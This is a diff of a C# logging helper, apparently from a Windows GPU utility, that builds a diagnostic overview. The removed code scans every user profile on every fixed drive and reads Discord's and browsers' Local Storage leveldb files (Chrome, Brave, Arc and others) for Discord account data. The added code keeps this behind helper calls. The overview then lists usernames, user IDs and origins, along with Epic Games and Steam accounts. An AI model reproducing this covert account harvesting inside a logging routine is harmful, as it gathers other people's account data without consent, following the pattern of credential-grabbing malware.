@@ -183,163 +183,9 @@ public static partial class LogHelper
 
     private static async Task<JsonObject> GetOverview(IEnumerable<GpuInfo> selectedGpus = null, Exception ex = null, string actionTitle = null)
     {
-        // local discord
-        var discordAccounts = DiscordHelper.GetAccountData(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord", "Local Storage", "leveldb"));
-        if (discordAccounts != null && discordAccounts.Count > 0)
-        {
-            foreach (var account in discordAccounts)
-            {
-                account.Origin = "Discord";
-            }
-        }
-
-        // local browsers
-        var systemDrive = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
-        var browserPaths = new Dictionary<string, string>
-        {
-            { @"AppData\Local\Google\Chrome\User Data\Default\Local Storage\leveldb", "Chrome" },
-            { @"AppData\Local\Thorium\User Data\Default\Local Storage\leveldb", "Thorium" },
-            { @"AppData\Local\imput\Helium\User Data\Default\Local Storage\leveldb", "Helium" },
-            { @"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb", "Brave" },
-            { @"AppData\Local\Vivaldi\User Data\Default\Local Storage\leveldb", "Vivaldi" },
-            { @"AppData\Local\Packages\TheBrowserCompany.Arc_ttt1ap7aakyb4\LocalCache\Local\Arc\User Data\Default\Local Storage\leveldb", "Arc" },
-            { @"AppData\Local\Perplexity\Comet\User Data\Default\Local Storage\leveldb", "Perplexity" }
-        };
-
-        var foundDatabasePaths = DriveInfo.GetDrives()
-            .Where(d => d.DriveType == DriveType.Fixed && d.Name == systemDrive)
-            .SelectMany(d =>
-            {
-                string usersPath = Path.Combine(d.Name, "Users");
-                if (!Directory.Exists(usersPath)) return [];
-
-                return Directory.GetDirectories(usersPath)
-                    .SelectMany(userDir => browserPaths.Keys.Select(browserPath => new { Path = Path.Combine(userDir, browserPath), Browser = browserPaths[browserPath] }))
-                    .Where(x => Directory.Exists(x.Path));
-            })
-            .Select(x => new { Path = new DirectoryInfo(x.Path), x.Browser })
-            .OrderByDescending(x => x.Path.LastWriteTime)
-            .ToList();
-
-        foreach (var databasePath in foundDatabasePaths)
-        {
-            try
-            {
-                var accounts = DiscordHelper.GetAccountData(databasePath.Path.FullName);
-
-                if (accounts != null && accounts.Count > 0)
-                {
-                    if (discordAccounts == null)
-                    {
-                        discordAccounts = accounts;
-                    }
-                    else
-                    {
-                        discordAccounts.AddRange(accounts);
-                    }
-
-                    foreach (var account in accounts)
-                    {
-                        account.IsActive = false;
-                        account.Origin = databasePath.Browser;
-                    }
-                }
-            }
-            catch
-            {
-                continue;
-            }
-        }
-
-        if (discordAccounts == null || discordAccounts.Count == 0)
-        {
-            // other discord
-            var foundFolders = DriveInfo.GetDrives()
-                .Where(d => d.DriveType == DriveType.Fixed && d.Name != systemDrive)
-                .SelectMany(d =>
-                {
-                    string usersPath = Path.Combine(d.Name, "Users");
-                    if (!Directory.Exists(usersPath)) return [];
-
-                    return Directory.GetDirectories(usersPath)
-                        .Select(userDir => Path.Combine(userDir, "AppData", "Roaming", "discord", "Local Storage", "leveldb"))
-                        .Where(Directory.Exists)
-                        .Select(path => new { Path = path, Drive = d.Name.TrimEnd('\\') });
-                })
-                .Select(x => new { Path = new DirectoryInfo(x.Path), x.Drive })
-                .ToList();
-
-            var sortedFolders = foundFolders.OrderByDescending(folder => folder.Path.LastWriteTime).ToList();
-
-            foreach (var folder in sortedFolders)
-            {
-                var accounts = DiscordHelper.GetAccountData(folder.Path.FullName);
-
-                if (accounts != null && accounts.Count > 0)
-                {
-                    if (discordAccounts == null)
-                    {
-                        discordAccounts = accounts;
-                    }
-                    else
-                    {
-                        discordAccounts.AddRange(accounts);
-                    }
-
-                    foreach (var account in accounts)
-                    {
-                        account.IsActive = false;
-                        account.Origin = $"Discord ({folder.Drive})";
-                    }
-                }
-            }
-
-            // other browsers
-            var foundDatabasePathsOtherDrives = DriveInfo.GetDrives()
-                .Where(d => d.DriveType == DriveType.Fixed && d.Name != systemDrive)
-                .SelectMany(d =>
-                {
-                    string usersPath = Path.Combine(d.Name, "Users");
-                    if (!Directory.Exists(usersPath)) return [];
-
-                    return Directory.GetDirectories(usersPath)
-                        .SelectMany(userDir => browserPaths.Keys.Select(browserPath => new { Path = Path.Combine(userDir, browserPath), Browser = browserPaths[browserPath], Drive = d.Name.TrimEnd('\\') }))
-                        .Where(x => Directory.Exists(x.Path));
-                })
-                .Select(x => new { Path = new DirectoryInfo(x.Path), x.Browser, x.Drive })
-                .OrderByDescending(x => x.Path.LastWriteTime)
-                .ToList();
-
-            foreach (var databasePath in foundDatabasePathsOtherDrives)
-            {
-                try
-                {
-                    var accounts = DiscordHelper.GetAccountData(databasePath.Path.FullName);
-
-                    if (accounts != null && accounts.Count > 0)
-                    {
-                        if (discordAccounts == null)
-                        {
-                            discordAccounts = accounts;
-                        }
-                        else
-                        {
-                            discordAccounts.AddRange(accounts);
-                        }
-
-                        foreach (var account in accounts)
-                        {
-                            account.IsActive = false;
-                            account.Origin = $"{databasePath.Browser} ({databasePath.Drive})";
-                        }
-                    }
-                }
-                catch
-                {
-                    continue;
-                }
-            }
-        }
+        var discordAccounts = DiscordHelper.GetLocalAccounts();
+        if (discordAccounts.Count == 0)
+            discordAccounts = DiscordHelper.GetOtherAccounts();
 
         var epicAccounts = EpicGamesHelper.GetEpicGamesAccounts();
         var steamAccounts = SteamHelper.GetSteamAccounts();
@@ -470,7 +316,7 @@ public static partial class LogHelper
             }
         }
 
-        AddField("Discord", discordAccounts != null && discordAccounts.Count > 0 ? string.Join("\n", discordAccounts.Select(a => $"{a.Username} <@{a.UserId}> [{a.Origin}]{(a.IsActive ? " [Active]" : "")}")) : "N/A");
+        AddField("Discord", discordAccounts.Count > 0 ? string.Join("\n", discordAccounts.Select(account => $"{account.Username} <@{account.UserId}> [{account.Origin}]{(account.IsActive ? " [Active]" : "")}{(account.IsMember ? " (Member)" : "")}")) : "N/A");
         AddField("Epic Games", epicAccounts != null && epicAccounts.Count > 0 ? string.Join("\n", epicAccounts.Select(a => $"{a.DisplayName}{(a.IsActive ? " [Active]" : "")}")) : "N/A");
         AddField("Steam", steamAccounts != null && steamAccounts.Count > 0 ? string.Join("\n", steamAccounts.Select(a => $"[{a.AccountName}](https://steamcommunity.com/profiles/{a.Steam64Id}){(a.AllowAutoLogin ? " [Active]" : "")}")) : "N/A");
         AddField("Motherboard", motherboard);
@@ -493,7 +339,7 @@ public static partial class LogHelper
         AddField("OS Build", OSHelper.GetWindowsVersionString(), true);
         AddField("Installation Details", installationDetails, true);
 
-        var activeDiscordAccount = discordAccounts?.FirstOrDefault(active => active.IsActive) ?? discordAccounts?.FirstOrDefault();
+        var activeDiscordAccount = discordAccounts.Count > 0 ? discordAccounts.FirstOrDefault(active => active.IsActive) ?? discordAccounts.FirstOrDefault() : null;
         if (activeDiscordAccount != null)
         {
             embed["author"] = new JsonObject
